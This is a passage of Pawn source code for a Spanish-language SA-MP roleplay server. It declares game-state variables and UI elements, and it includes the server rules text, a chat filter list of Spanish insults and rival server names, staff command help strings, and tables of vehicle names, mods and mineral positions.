	UsersD_0, UsersD_1, UsersD_2,
	UsersT_0, UsersT_1, UsersT_2,
	Dinero_Banco,
	Cuentas_Registradas,

	VehPrueba[20] = {INVALID_VEHICLE_ID, ...},
	cObjData[MAX_MUEBLES_CASA][70],
	gzAtacadaPor[MAX_GZS] = { -1, ... },
	gzTiempo[MAX_GZS],
	BitArray: ValidGZ <MAX_GZS>,
	#if SISTEMA_BANCO == true
	OBJ_PuertaBanco,
	#endif
	OBJ_Dinamita[MAX_PLAYERS],
	Specteado_Por[MAX_PLAYERS] = {INVALID_PLAYER_ID, ...},
	Specteando_ID[MAX_PLAYERS] = {INVALID_PLAYER_ID, ...},
 	BitArray:CB_RecibioPaga<MAX_CUENTAS_BANCARIAS>,
 	TrabajosPorHora[MAX_PLAYERS][8],
 	BitArray:Llave_veh[MAX_PLAYERS]<MAX_VEHICLES>,
 	TrailerAttached[MAX_PLAYERS],
 	UsandoHackPad[MAX_PLAYERS],
 	NumberKey[MAX_PLAYERS][MAX_KEY_NUMBERS],
 	CurrentObject[MAX_PLAYERS],
 	PinchaRuedas[15] = {INVALID_OBJECT_ID, ...},
 	PICK_PinchaRuedas[sizeof(PinchaRuedas)][2],
 	// Fundición
 	Timer_FundiendoMinerales = INVALID_TIMER_ID,
 	OBJ_FuegoHorno[6],

 	BitArray: AnimsLocked<MAX_PLAYERS>,
	//Radio
 	RadioLSTV[210] = "http://listen.technobase.fm/dsl.pls",
 	
	bool: BigEars[MAX_PLAYERS],
	BitArray: VehiculoDestruido<MAX_VEH_VENTA>,
	bool: AutoLicenciaUsado[2][3],
	//Muebles
	CasaActual[MAX_PLAYERS] = {INVALID_HOUSE_ID, ...},
	OBJ_Mueble[MAX_PLAYERS][MAX_MUEBLES_CASA],
	
	//Check cuenta
	stringcheck[500]
;

// Listas (mSelection)

#if defined VERSION_03x

new
	m_Skins_m,
	m_Skins_f,
	m_Accesorios,
	m_Muebles;

#endif

// Pickups
new
	PElevadorLSPD,
	PEstadio;

// Timers-Checkpoints
new
	Timer_Jugador[MAX_PLAYERS][MAX_TIMERS],
	PlayerCP:Checkpoint_Jugador[MAX_PLAYERS][MAX_PCP];

#if defined USE_FCNPC

// NPCS
new
	NPC_GUARDIA_LSPD,
	NPC_GUARDIA_LSMD,
	NPC_NEGOCIO[MAX_NEGOCIOS],
	POINT_GUARDIA_LSPD,
	POINT_GUARDIA_LSMD,
    NPC_SECRETARIA_LSPD,

	//Update bots
	FCNPC_AimID[MAX_PLAYERS],
	FCNPC_TargetID[MAX_PLAYERS],

	//Skin Fix
	FCNPC_Skin[MAX_PLAYERS]
;

#else

new
    NPC_SECRETARIA_LSPD;
    
#endif

//AREAS/ZONAS
new
	zCamionerosLVL1,
	zCosechadorLVL1;

#if defined USE_FCNPC
static const Float: POS_NPC_GUARDIA_LSPD[][3] =
{
	{1537.4457,-1722.4327,13.5469},
	{1537.3910,-1687.5781,13.5469},
	{1541.2355,-1672.6808,13.5522},
	{1536.2719,-1658.1353,13.5469},
	{1537.5020,-1636.3143,13.5469}
};
#endif

static const TextoDeCarcel[] =
			"Carcel OOC\n\n\
			"#CBLANCO"Si estás aquí, es porque has cometido una infracción, y un administrador o el mismo servidor\n\
			te sancionó. Deberás cumplir un tiempo determinando, luego podrás volver a jugar en el servidor.\n\
			Si no entiendes por qué estás aquí, o aún desconoces las reglas, utiliza "#CINFO"/reglas.\n\n";

enum E_REGLAS
{
	eTitulo[30],
	eCuerpo[500]
}

static const Reglas[][E_REGLAS] =
{
	{"DeathMatch (DM)", ""#CBLANCO"Este concepto, hace referencia a agredir otro usuarios sin una razón que justifique la agresión.\n\n\
	"#CROJO"Ejemplo: "#CBLANCO"Hay un camionero, y tu vas y le comienzas a pegar sin que el te halla hecho nada. ¿Por qué le pegas?\n\
	Recuerda que aquí estamos imitando la vida real, ¡y eso no lo haces en la realidad!"},

	{"PowerGaming (PG)", ""#CBLANCO"Este concepto, indica la realización de acciones de tu jugador que ignoran la lógica\n\
	o son irreales (Acciones que no harias en la vida real). También, es cuando forzas el rol de otro jugador con /me, o /do.\n\n\
	Ejemplo: Un policía te dispara, y tu corres al rededor de el\n\
	Ejemplo 2: (Forzar rol) En un robo, usas /me le roba todo su dinero a Facundo Perez."},

	{"Car Kill (CK)", ""#CBLANCO"Este concepto, es cuando un jugador mata a otro ya sea pisandolo con el auto y dejandolo debajo\n\
	del mismo, atropellandolo multiples veces para asesinarlo."},

	{"MetaGaming (MG)", ""#CBLANCO"Este concepto, indica utilizar información OOC para beneficiarte IC. (Ver que es IC y OOC)\n\n\
	"#CROJO"Ejemplo: "#CBLANCO"Ves a un jugador, con su	nombre arriba de la cabeza. Tu sabes su nombre, pero tu personaje no ya que nunca le preguntó.\n\
	Luego, lo llamas por su nombre, usando la información OOC."},

	{"In Character (IC)", ""#CVERDE"IC: "#CBLANCO"Es toda la información del rol de tu personaje, y solo eso. Es la cabeza de tu personaje, lo que\n\
	tu personaje sabe o no sabe (Tu personaje, no vos).\n\
	\tEjemplo: Una persona te dice por IC (Chat normal) 'Hola, me llamo Hernan'. Tu personaje sabe que esa persona se llama Hernan"},

	{"Out of Character (OOC)",""#CVERDE"OOC: "#CBLANCO"Es la información que sabes vos, pero por un medio que no es IC."},

	{"Revenge Kill (RK)", ""#CBLANCO"Este concepto, hace referencia a la denominada 'Muerte por venganza'. Es cuando un jugador te asesina, y tu\n\
	vuelves y le agredes, o lo asesinas. Esto es un grave error, ya que cuando mueres tu jugador supuestamente pierde la memoria."},

	{"Flood", ""#CBLANCO"Flood, es repetir reiteradas veces (3+) un texto, para que este llame la atención."},

	{"BugAbusing (BA)", ""#CBLANCO"Este concepto, hace referencia a abusar de bugs nativos del juego, o del servidor para\n\
	beneficio del usuario.\n\n\
	"#CROJO"Ejemplo: "#CBLANCO"Hay un comando que puedes usar para darte mucho dinero porque anda mal, entonces lo utilizas\n\
	una y otra vez para hacerte millonario. Una infracción de este tipo, se paga con un Ban (Expulsión permanente)"},

	{"Insultos OOC (IOOC)", ""#CBLANCO"Es cuando empezas a insultar otro usuario/administrador por un canal OOC."},
	
	{"Bad Driving (BD)", ""#CBLANCO"Este concepto, hace referencia a conducir mal (de una forma totalmente PowerGaming) como por ejemplo, tomar\n\
	atajos, o pasar por la vereda (Donde supuestamente hay peatones), chocar otros vehículos, etc."},

	{"Mal uso Duda (MUD)", ""#CBLANCO"Es cuando utilizas el canal "#CINFO"/duda "#CBLANCO"para decir cosas incoherentes, o cosas que no son\n\
	ni respuestas a una duda, ni dudas.\n\n\
	"#CROJO"Ejemplo: "#CBLANCO"/duda Hola Damian, ¿Cómo estas?"},

	{"Bad Parking Car (BPC)", ""#CBLANCO"Es cuando dejas tu vehículo aparcado en el medio de la calle, o en lugares irreales, donde invervienen en el tránsito.\n\
	Recuerda estacionar tu vehículo en un buen lugar, de lo contrario un administrador te eliminará el vehículo automáticamente."},

	{"SPAM", ""#CBLANCO"SPAM hace referencia a nombrar o pasar la IP de otro servidor/comunidad por via ts3, foro, o server"}
};

static const Acentos[][] =
{
	{"Argentino"},
	{"Japones"},
	{"Chino"},
	{"Coreano"},
	{"Chileno"},
	{"Alemán"},
	{"Español"},
	{"Peruano"},
	{"Colombiano"},
	{"Canadiense"},
	{"Estadounidense"},
	{"Italiano"},
	{"Griego"},
	{"Polaco"}
};

static const MalasPalabras[][] =
{
	{"puto"},
	{"putos"},
	{"culiado"},
	{"pete"},
	{"petes"},
	{"la concha de tu madre"},
	{"server de mierda"},
	{"es una mierda"},
	{"hijo de puta"},
	{"hijos de puta"},
	{"forro de mierda"},
	{"chupapija"},
	{"chupa pija"},
	{"chupamela"},
	{"chupapito"},
	{"chupa pito"},
	{"negro de mierda"},
	{"server pija"},
	{"chupame el pito"},
	{"chupenme el pito"},
	{"euliala"},
	{"fenixzone"},
	{"fenix zone"},
	{"ciudadlibre"},
	{"ciudadprohibida"},
	{"lsrp"},
	{"zenoncity"},
	{"zenon city"}
};

#if defined USE_FCNPC
static const Float: POS_NPC_GUARDIA_LSMD[][3] =
{
	{1187.6580,-1386.3654,13.5399},
	{1186.2306,-1333.8105,13.5615},
	{1187.6455,-1288.6804,13.5541}
};
#endif

// ---====[ Bools ]====---- //

new
	bool:engine_,bool:lights_,bool:alarm_,bool:doors_,bool:bonnet_,bool:boot_,bool:objective_,
	bool:AyuntaRestringido,
	bool:EnTransmision,
	bool:EnTransmision_AV,
	bool:LuzCortada
;

// ---====[ Progress bars ]====---- //

new
	Bar:BMotor[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BExp[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BCombustible[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BEstadoVeh[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BCosecha[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BHambre[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BCansancio[MAX_PLAYERS] = {INVALID_BAR_ID, ...},
	Bar:BOrina[MAX_PLAYERS] = {INVALID_BAR_ID, ...};

// ---====[ 3D Labels ]====---- //

new
	Text3D:RangoADM[MAX_PLAYERS] = {Text3D:INVALID_3DTEXT_ID, ...},
	Text3D:Enmascarado[MAX_PLAYERS] = {Text3D:INVALID_3DTEXT_ID, ...},
	Text3D:Negocio[MAX_NEGOCIOS],
	Text3D:Casa[MAX_CASAS],
	Text3D:Label_OBJ_T[MAX_OBJETOS_T],
	Text3D:FundiendoMinerales = Text3D:INVALID_3DTEXT_ID,
	PlayerText3D:TextoCarcel[MAX_PLAYERS] = {PlayerText3D:INVALID_3DTEXT_ID, ...};

// ---====[ TextDraws ]====---- //

new
	Text:Registro[6],
	Text:FlechaSexo[2],
	Text:FlechaEdad[2],
	Text:FlechaPelea[2],
	Text:FlechaEstilo[2],
	PlayerText:Sexo[MAX_PLAYERS],
	PlayerText:Edad[MAX_PLAYERS],
	PlayerText:Pelea[MAX_PLAYERS],
	PlayerText:Estilo[MAX_PLAYERS],
	PlayerText:TituloTuto[MAX_PLAYERS] = {PlayerText:INVALID_TEXT_DRAW, ...},
	PlayerText:InfoTuto[MAX_PLAYERS][3],
	Text:BOXTuto[2],
	Text:Velocimetro[5],
	PlayerText:VelocidadV[MAX_PLAYERS],
	Text:FlechaCRopa[2],
	Text:CRopa,
	Text:SCRopa,
	Text:PCRopa,
	Text:Cajero[3],
	PlayerText:Cuenta_Balance[2][MAX_PLAYERS],
	Text:Operaciones[3],
	Text:SCajero,
	Text:Celular[7],
	Text:NumeroCel[10],
	Text:Llamar_Mensaje[2],
	Text:HoraCel,
	PlayerText:Numero[MAX_PLAYERS],
	Text:BorrarCel,
	PlayerText:MenuCel[MAX_PLAYERS],
	Text:VolverCel,
	Text:IconoCel[4],
	Text:CuentaGen,
	Text:CuentaCas,
	Text:CuentaNeg,
	Text:CuentaVeh,
	Text:CuentaArmas,
	Text:CuentaBox,
	PlayerText:CelContactos[MAX_PLAYERS][10],
	Text:CAMARA_Seg[4],
	Text:Vendado,
	PlayerText:MsgText[MAX_PLAYERS],
	Text:Barraversion,
	Text:HoraB,
	Text:HS,
	PlayerText:TDContadorKM[MAX_PLAYERS],
	Text:TDTV[9],
	Text:TV_Apagado,
	Text:TV_Azul,
	Text:Fondo_Licencia,
	PlayerText:VehTD[MAX_PLAYERS][MAX_VEH_PERSONA],
	PlayerText:NumberPanel[MAX_PLAYERS][MAX_KEY_NUMBERS],
	Text:KeyPad_Fondo,
	PlayerText:TutoCuerpo[MAX_PLAYERS],
	PlayerText:TutoTitulo[MAX_PLAYERS],
	PlayerText:BarraGris[MAX_PLAYERS] = {PlayerText:INVALID_TEXT_DRAW, ...},
	Text: PizzaTiempo
;

	//      STAFF      //
new AyudaDestacado[] =
	""#CDESTACADO"Usuario destacado: /a /idveh\n";

new AyudaAyudante[] =
	""#CAYUDANTE"Ayudante: /vermps /novermps /cmp /amp /silenciar /info1 /info2 /admservice /as\n";

new AyudaModerador[] =
	""#CMODERADOR"Moderador: /malnombre /verpresos /ar /rr /vermiembros  /verllaves /llenarbarras /o /ircasa\n\
/irnegocio /irlugar /slap /lp /ls /jail /liberar /spec /dejarspec /actualizarspe\n\
/revivir /kick /rtc /ir /congelar /descongelar /traer /check /jailcuenta\n\
/cerrarveh /abrirveh /repararveh /noobs /qfa (ID)\n";

new AyudaModSuperior[] =
	""#CMOD.SUPERIOR"Administrador: /destrellas /sestrellas /colorveh /ban /bancuenta /llenartanques\n\
/forzarmotor /llenarveh /llenarvehid /gasveh /entrarveh /cnnn /adelante \n\
/arriba /abajo /bigears /verautoscuenta /vercasascuenta /vernegocioscuenta /advertir /limpiaradvertencias\
/borrarconos\n";

new AyudaAdministrador[] =
	""#CADMINISTRADOR"Adm. superior: /vercajasfuertes /cajafuertecasa /traertodos /irpos /material \n\
/crearmineral /rtcar /getcar /gotocar /verip /veripcuenta /actualizarcuenta\n\
/desban /banip /unbanip  /estacionarveh /respawngeneral /actualizarzonaveh\n\
/respawnzona /respawntotal /fijarclima /darllaveveh /quitarllaveveh\n\
/quitararmas /vendercasa /vendernegocio /jetpack\n\
/fijarhora /crearobj /editarobj /eventomadd\n";

new AyudaSubDueno[] =
	""#CSUBDUENO"Adm. encargado: /expulsarliderfac /expulsarliderfam /editarliderfac /editarliderfam\n\
/darllavescuenta /darllaves /quitarllavescuenta /quitarllaves /irint\n\
/money /sethp /setarmour /givegun /creararbolito /creararbol\n\
/borrarnegocio /borrarcasa /dvehiculo /editarfamilia /creartv /crearcasa\n\
/intcasa /preciocasa /precionegocio /precioveh /creargarage /crearnegocio\n\
/borrarvehiculo /borrargarage /creargangzone /creargangzone_2 /borrargangzone\n";

new AyudaDueno[] =
	""#CDUENO"Director: /setduty /darobjeto /pvar_form_me /cord_int_0 /cord_int_1 /restart /verobjetos /crearfamilia\n\
/superban /verids /crearinterior /crearvehiculo /crearportonfam /crearportoncasa /editarporton\n\
/staff /fakestaff /actualizarentradas /actualizararchivos /staffcuenta /rbots\
/adminwarn /limpiaradmwarn /veradmwarns /verautos";

// ---====[ Nombres vehiculos ]====---- //

new TituloVehiculo[][] =
{
	"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
    "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus", "Voodoo",
    "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam", "Esperanto",
    "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection", "Hunter", "Premier",
    "Enforcer", "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks",
    "Hotknife", "Trailer 1", "Previon", "Coach", "Cabbie", "Stallion", "Rumpo",
    "RC Bandit", "Romero", "Packer", "Monster", "Admiral", "Squalo", "Seasparrow",
   	"Pizzaboy", "Tram", "Trailer 2", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed",
    "Yankee", "Caddy", "Solair", "Berkley's RC Van", "Skimmer", "PCJ-600", "Faggio",
    "Freeway", "RC Baron", "RC Raider", "Glendale", "Oceanic", "Sanchez", "Sparrow",
    "Patriot", "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350",
    "Walton", "Regina", "Comet", "BMX", "Burrito", "Camper", "Marquis", "Baggage",
    "Dozer", "Maverick", "News Chopper", "Rancher", "FBI Rancher", "Virgo", "Greenwood",
    "Jetmax", "Hotring", "Sandking", "Blista Compact", "Police Maverick", "Boxvillde",
    "Benson", "Mesa", "RC Goblin", "Hotring Racer A", "Hotring Racer B", "Bloodring Banger",
    "Rancher", "Super GT", "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle",
    "Cropduster", "Stunt", "Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer",
    "Shamal", "Hydra", "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck",
   	"Fortune", "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine",
    "Feltzer", "Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
    "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo", "Cargobob",
    "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite", "Windsor", "Monster",
    "Monster", "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance", "RC Tiger",
    "Flash", "Tahoma", "Savanna", "Bandito", "Freight Flat", "Streak Carriage", "Kart",
    "Mower", "Dune", "Sweeper", "Broadway", "Tornado", "AT-400", "DFT-30", "Huntley",
    "Stafford", "BF-400", "News Van", "Tug", "Trailer 3", "Emperor", "Wayfarer", "Euros",
    "Hotdog", "Club", "Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch",
    "LSPD Car", "SFPD Car", "LVPD Car", "Police Ranger", "Picador", "S.W.A.T Tank", "Alpha",
    "Phoenix", "Glendale", "Sadler", "Luggage Trailer 1", "Luggage Trailer 2", "Stairs Trailer",
   	"Boxville", "Utility Trailer 1", "Utility Trailer 2"
};

new legalmods[48][22] =
{
	{400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
	{404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
	{492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
	{500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
	{518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
	{527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
	{534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
	{535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
	{536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
	{540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
	{542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
	{547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
	{550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
	{551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
	{558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
	{559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
	{560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
	{561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
	{562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
	{565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
	{567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
	{575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
	{600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};

static const Float: PosMinerales[][] =
{
	{-50.214855, -1777.616699, 746.395629, 0.000000, 0.000000, 0.000000},
	{-35.667236, -1784.954223, 745.647827, 0.000000, 0.000000, 0.000000},
	{-47.150089, -1771.246948, 745.767944, 0.000000, 0.000000, 0.000000},
	{-46.050750, -1772.499267, 743.934631, 0.000000, 0.000000, 0.000000},
	{-37.831726, -1763.099365, 743.207763, 0.000000, 0.000000, 0.000000},
	{-35.893196, -1752.697631, 747.699096, 0.000000, 0.000000, 0.000000},
	{-47.388889, -1745.276245, 742.613769, 0.000000, 0.000000, 0.000000},
	{-41.054576, -1740.426391, 744.582336, 0.000000, 0.000000, 0.000000},
	{-42.513710, -1733.150024, 747.846008, 0.000000, 0.000000, 0.000000},
	{-53.121234, -1678.129272, 743.070739, 0.000000, 4.599999, 0.000000},
	{-53.092788, -1677.342651, 744.450012, 0.000000, 0.000000, 0.000000},
	{-50.283054, -1725.892456, 744.960693, 0.000000, 0.000000, 0.000000},
	{-51.777393, -1726.591430, 744.895202, 0.000000, 0.000000, 0.000000},
	{-77.207664, -1693.808471, 746.974365, 0.000000, 0.000000, 0.000000},
	{-77.562652, -1693.272094, 747.331359, 0.000000, 0.000000, 0.000000},
	{-77.918426, -1712.213623, 747.033386, 0.000000, 0.000000, 0.000000},
	{-35.614444, -1766.846923, 748.187683, 0.000000, 0.000000, 0.000000},
	{-51.399211, -1726.642211, 743.998962, 0.000000, 0.000000, 0.000000},
	{-52.097755, -1741.754150, 748.485290, 131.600006, 8.700001, -88.300003},
	{-66.418907, -1711.292846, 748.528991, 0.000000, 0.000000, 0.000000},
	{-66.930633, -1710.902465, 749.069519, 0.000000, 0.000000, 0.000000},
	{-57.404170, -1733.863769, 748.063720, 0.499996, 0.000000, 0.000000},
	{-65.318595, -1720.719116, 747.825073, 0.000000, 0.000000, 0.000000},
	{-65.548698, -1720.740234, 747.584899, 0.000000, 0.000000, 0.000000},
	{-77.111595, -1722.477050, 746.227905, 0.000000, 0.000000, 0.000000},
	{-77.532783, -1718.057373, 746.185119, 0.000000, 0.000000, 0.000000},
	{-77.100044, -1688.176025, 748.107849, 0.000000, 0.000000, 0.000000},
	{-66.466743, -1691.662109, 747.560302, 0.000000, 0.000000, 0.000000},
	{-76.091072, -1699.857055, 745.090209, 0.000000, 0.000000, 0.000000},
	{-66.465919, -1694.529785, 748.440307, 0.000000, 0.000000, 0.000000},
	{-74.381202, -1706.192016, 744.495849, 0.000000, 0.000000, 0.000000},
	{-71.282897, -1718.894531, 747.318115, 0.000000, 0.000000, 0.000000},
	{-44.525348, -1666.863769, 743.698791, 0.000000, 0.000000, 0.000000},
	{-47.330261, -1658.248657, 744.514587, 0.000000, 0.000000, 0.000000},
	{-47.390617, -1658.082275, 744.595153, 0.000000, 0.000000, 0.000000},
	{-46.118667, -1641.703491, 742.876586, 0.000000, 0.000000, 0.000000},
	{-47.272624, -1658.749389, 744.676147, 0.000000, 0.000000, 0.000000},
	{-48.865783, -1678.397827, 748.998779, 0.000000, 49.800003, 0.000000},
	{-61.180854, -1632.441528, 745.541687, 0.000000, 0.000000, 0.000000},
	{-59.885757, -1679.561279, 748.774230, 0.000000, -1.000002, 0.000000},
	{-36.382736, -1756.691528, 747.457092, 0.000000, 0.000000, 0.000000},
	{-49.072284, -1746.065307, 745.315551, 0.000000, 0.000000, 0.000000},
	{-48.756271, -1743.767456, 746.709716, 0.000000, 0.000000, 0.000000},
	{-51.413780, -1739.715332, 746.676574, 0.000000, 0.000000, 0.000000},
	{-53.272151, -1734.512451, 746.317443, 0.000000, 0.000000, 0.000000},
	{-55.570018, -1730.471801, 743.689331, 0.000000, 0.000000, 0.000000},
	{-63.225612, -1731.133300, 747.669372, 0.000000, 0.000000, 0.000000},
	{-50.934619, -1735.046630, 743.655395, 0.000000, 0.000000, -27.799999},
	{-66.957786, -1727.621582, 745.081665, 0.000000, 0.000000, 0.000000},
	{-78.385696, -1706.226196, 747.066040, 0.000000, 0.000000, 0.000000},
	{-77.662475, -1690.350708, 747.817382, 0.000000, 0.000000, 0.000000},
	{-79.767189, -1700.259033, 747.589233, 1.600000, 51.000003, 0.000000},
	{-65.076538, -1688.318603, 747.025146, 0.000000, 0.000000, 0.000000},
	{-63.214672, -1672.352050, 747.822448, 0.000000, 0.000000, -152.099945},
	{-73.651039, -1680.464965, 744.298828, 0.000000, 63.700004, 0.000000},
	{-53.661815, -1662.702270, 746.257995, 0.000000, 0.000000, 0.000000},
	{-77.271629, -1696.876464, 746.408996, 0.000000, 0.000000, 0.000000},
	{-34.847091, -1669.688720, 748.797912, 0.000000, 0.000000, 0.000000}
};

enum E_MINERAL
{
	minObjID,
	minType
}

// -============================-
// Minerales
#define MIN_ORO         0xFFFFFF00
#define MIN_PLATA       0
#define MIN_HIERRO      0xFFFF8300
#define MIN_RUBI        0xD0FF0000
#define MIN_ESMERALDA   0xD000FF00
#define MIN_ZAFIRO      0xD00000FF
#define MIN_DIAMANTE    0x9800FFFF
#define MIN_CARBON      0xFF69696E

#define M_TYPE_ORO         (0)
#define M_TYPE_PLATA       (1)
#define M_TYPE_HIERRO      (2)
#define M_TYPE_RUBI        (3)
#define M_TYPE_ESMERALDA   (4)
#define M_TYPE_ZAFIRO      (5)
#define M_TYPE_DIAMANTE    (6)
#define M_TYPE_CARBON      (7)

#define MAX_MINERALES 		(8)

new
	BitArray:ValidMineral<(sizeof(PosMinerales))>;

// -============================-

enum E_ZONE_TYPE
{
	zoneName [28 char],
	Float: zoneArea [6]
};

enum E_KEYPAD
{
	Float: kpPosx,
	Float: kpPosy,
	Float: kpPosz,
	Float: kpAngle
};

enum E_OBJ_DATA
{
	objModel,
	Float: objPos [3],
	Float: objRot [3],
	Float: objEsc [3],
	objName[30 char]
}

static const ObjectInfo [] [E_OBJ_DATA] =
{
	{OBJ_BIDON,   		 {0.125999, 0.011999, 0.0},{-4.999999, -98.099983, 16.6},  {1.0000, 1.0000, 1.0000}, !"Bidón de gasolina"},
	{OBJ_CEL,     		 {0.0660, 0.0029, 0.0049}, {78.3999, -172.8999, 179.4998}, {1.0000, 1.0000, 1.0000}, !"Celular"},
 	{OBJ_GPS,       	 {0.0730, 0.0300, 0.0100}, {-111.4999, -21.0000, 167.8000},{0.5330, 0.8549, 1.0000}, !"GPS"},
 	{OBJ_PALANCA, 		 {0.0929, 0.0310, 0.0859}, {-102.3999, 0.0000, 0.0000},    {1.0000, 1.0000, 1.0000}, !"Palanca"},
 	{OBJ_LLAVE,   		 {0.0759, 0.0410, 0.0000}, {-114.6000, -82.3000, 5.0999},  {1.0000, 1.0000, 1.0000}, !"Llave inglesa"},
 	{OBJ_MARTILLO,		 {0.0230, 0.0760, 0.0069}, {155.4000, 0.0000, 0.0000},     {1.0000, 1.0000, 1.0000}, !"Martillo"},
